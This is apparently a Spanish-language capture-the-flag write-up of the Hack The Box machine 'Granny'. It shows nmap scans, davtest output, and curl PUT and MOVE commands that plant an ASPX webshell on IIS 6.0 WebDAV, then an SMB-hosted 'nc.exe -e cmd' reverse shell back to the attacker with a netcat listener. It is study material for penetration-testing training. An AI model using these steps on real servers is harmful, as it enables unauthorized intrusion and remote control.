# Granny

## Network Enumeration with `NMAP`

```markdown
└─# nmap 10.10.10.15 -vvv --open -Pn -sS --min-rate 5000 -p- -n -oA nmap
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 12:12 EDT
Initiating SYN Stealth Scan at 12:12
Scanning 10.10.10.15 [65535 ports]
Discovered open port 80/tcp on 10.10.10.15
Completed SYN Stealth Scan at 12:12, 26.64s elapsed (65535 total ports)
Nmap scan report for 10.10.10.15
Host is up, received user-set (0.18s latency).
Scanned at 2024-06-03 12:12:16 EDT for 27s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.77 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 22 (968B)
```


```markdown
└─# nmap 10.10.10.15 -sCV -p80 -oN target
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 12:14 EDT
Nmap scan report for 10.10.10.15
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan:
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Mon, 03 Jun 2024 16:14:44 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  WebDAV type: Unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.30 seconds

```
                                    
                                 
                                 
# Abusing PUT & MOVE Methods

### El sitio es vulnerable a webdav, se pueden subir archivos por el metodo PUT, con la fucion `davtest` podemos probar que extensiones se permiten subir 

```markdown
└─# davtest -url http://10.10.10.15/
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: zRZjpWZhnsN
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_zRZjpWZhnsN
********************************************************
 Sending test files
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.html
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.jsp
PUT     shtml   FAIL
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.txt
PUT     asp     FAIL
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.pl
PUT     cgi     FAIL
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.jhtml
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.php
PUT     aspx    FAIL
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.cfm
********************************************************
 Checking for test file execution
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.html
EXEC    html    FAIL
EXEC    jsp     FAIL
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.txt
EXEC    txt     FAIL
EXEC    pl      FAIL
EXEC    jhtml   FAIL
EXEC    php     FAIL
EXEC    cfm     FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_zRZjpWZhnsN
PUT File: http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.html
PUT File: http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.jsp
PUT File: http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.txt
PUT File: http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.pl
PUT File: http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.jhtml
PUT File: http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.php
PUT File: http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.cfm
Executes: http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.html
Executes: http://10.10.10.15/DavTestDir_zRZjpWZhnsN/davtest_zRZjpWZhnsN.txt
```

# Uploading Aspx WebShell

### Con `Curl` tambien podemos subir archivos, debemos crear un archivo primero desde el directorio enviarlo

`curl -s -X PUT http://10.10.10.15/ejemplo.txt -d @whoami.txt `

### El servidor no permite subir archivos aspx pero permite subir archivos txt, estando dentro podemos usar la funcion move de `curl`

`curl -s -X MOVE -H "Destination:http://10.10.10.15/cmdasp.aspx"  http://10.10.10.15/cmdasp.txt`

### Pero antes de eso debemos buscar el websell kali trae uno que se llama `cmdasp.aspx`

```markdown
locate cmdasp.aspx
/usr/share/webshells/aspx/cmdasp.aspx
```
### Cuando subamos el archivo y modifiquemos la extension abrira una ventana como la siguiente.

![WebShell](https://raw.githubusercontent.com/jhonjairo-coder/OSCP_NOTES/main/Images/granny/imagen1.jpg)

###  Ahora con impaket smb compartimos la carpeta actal por smb

`impacket-smbserver smbshare $(pwd) -smb2support`

###  Ya con la cartpera compatida podemos ejecutar el comando con la webshell para que alcance a `netcat` ponemos a la escucha netcat con el puerto y lanzamos el comando.

###  Comando para lanzar nc desde la carpeta compartida

`\\10.10.14.37\smbshare\nc.exe -e cmd 10.10.14.37 4442`

### Puerto a la escucha

`rlwrap nc -lvnp 4442`


